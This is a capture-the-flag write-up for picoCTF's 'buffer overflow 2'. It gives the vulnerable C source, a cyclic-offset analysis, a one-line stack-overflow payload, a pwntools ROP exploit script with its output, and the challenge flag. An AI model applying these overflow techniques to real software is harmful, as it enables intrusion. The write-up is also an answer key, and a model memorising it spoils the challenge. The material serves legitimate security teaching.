# buffer overflow 2
Binary Exploitation, 250 points

## Description:
> Alright, this time you'll need to control some arguments. Can you get the flag from this program?

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 100
#define FLAGSIZE 64

void win(unsigned int arg1, unsigned int arg2) {
  char buf[FLAGSIZE];
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("Flag File is Missing. Problem is Misconfigured, please contact an Admin if you are running this on the shell server.\n");
    exit(0);
  }

  fgets(buf,FLAGSIZE,f);
  if (arg1 != 0xDEADBEEF)
    return;
  if (arg2 != 0xDEADC0DE)
    return;
  printf(buf);
}

void vuln(){
  char buf[BUFSIZE];
  gets(buf);
  puts(buf);
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);

  puts("Please enter your string: ");
  vuln();
  return 0;
}


```

## Solution:

We need to overflow the local buffer in the `vuln()` function and build the stack so that we return to `win()` with the two arguments it's expecting.

Here's how to do it manually ([this](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf) is a great tutorial):
```console
# cyclic 1000 | ./vuln
Please enter your string: 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaaj
Segmentation fault

# dmesg | grep vuln
[30276.522768] vuln[3738]: segfault at 62616164 ip 0000000062616164 sp 00000000ffde7fe0 error 14 in libc-2.27.so[f7d1b000+19000]

# cyclic -l 0x62616164
112

user@pico-2018-shell-3:/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa$ python -c "from pwn import *; print 'A'*112+ p32(0x080485CB)+'BBBB'+p32(0xdeadbeef)+p32(0xdeadc0de)" | ./vuln
Please enter your string: 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˅BBBBﾭ�����
picoCTF{addr3ss3s_ar3_3asy1b78b0d8}Segmentation fault (core dumped)
```

However, pwntools has a `ROP` class that does all the hard work:
```python
from pwn import *
import argparse
import os

EXECUTABLE = "vuln"
LOCAL_PATH = "./"
REMOTE_PATH = "/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/"
SSH_SERVER = "2018shell3.picoctf.com"

def get_process_path(is_ssh = False):
    if is_ssh or os.path.exists(REMOTE_PATH):
        return REMOTE_PATH + EXECUTABLE
    else:
        return LOCAL_PATH + EXECUTABLE

def get_process(ssh_user = None):
    is_ssh = ssh_user is not None
    path = get_process_path(is_ssh)
    params = {"argv": path, "cwd": os.path.dirname(path)}
    if is_ssh:
        s = ssh(host=SSH_SERVER, user=ssh_user)
        p = s.process(**params)
    else:
        p = process(**params)
    return p

def send_payload(proc, payload):
    proc.sendlineafter("Please enter your string:", payload)

def get_overflow_offset():
    # It's problematic to create a core dump on an NTFS file system,
    # so reconfigure core dumps to be created elsewhere
	os.system("echo ~/core/core_dump > /proc/sys/kernel/core_pattern")

	proc = process(get_process_path())
	payload = cyclic(150)
	send_payload(proc, payload)
	proc.wait()
	offset = cyclic_find(proc.corefile.eip)
	log.info("Overflow offset: {}".format(offset))
	return offset


parser = argparse.ArgumentParser()
parser.add_argument("-s", "--ssh_user", help="Connect via SSH with the given username")
args = parser.parse_args()

e = ELF(get_process_path())
context.binary = e.path
offset = get_overflow_offset()

r = ROP(e)
r.win(0xDEADBEEF, 0xDEADC0DE)

print r.dump()

payload = fit({offset: str(r)})

p = get_process(args.ssh_user)
send_payload(p, payload)
print p.recvall()
```

Output:
```console
root@kali:/media/sf_CTFs/pico/buffer_overflow_2# python exploit.py --ssh_user=$pico_ssh_user
[*] '/media/sf_CTFs/pico/buffer_overflow_2/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process './vuln': pid 4003
[*] Process './vuln' stopped with exit code -11 (SIGSEGV) (pid 4003)
[+] Parsing corefile...: Done
[*] '/media/sf_CTFs/pico/buffer_overflow_2/core.4003'
    Arch:      i386-32-little
    EIP:       0x62616164
    ESP:       0xffd93700
    Exe:       '/media/sf_CTFs/pico/buffer_overflow_2/vuln' (0x8048000)
    Fault:     0x62616164
[*] Overflow offset: 112
[*] Loaded cached gadgets for './vuln'
0x0000:        0x80485cb win(0xdeadbeef, 0xdeadc0de)
0x0004:           'baaa' <return address>
0x0008:       0xdeadbeef arg0
0x000c:       0xdeadc0de arg1
[+] Connecting to 2018shell3.picoctf.com on port 22: Done
[*] user@2018shell3.picoctf.com:
    Distro    Ubuntu 16.04
    OS:       linux
    Arch:     amd64
    Version:  4.4.0
    ASLR:     Enabled
[+] Starting remote process '/problems/buffer-overflow-2_2_46efeb3c5734b3787811f1d377efbefa/vuln' on 2018shell3.picoctf.com: pid 400221
[+] Receiving all data: Done (166B)
[*] Stopped remote process 'vuln' on 2018shell3.picoctf.com (pid 400221)
 
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab˅\x0baaaﾭ�����
picoCTF{addr3ss3s_ar3_3asy1b78b0d8}

```

The flag: picoCTF{addr3ss3s_ar3_3asy1b78b0d8}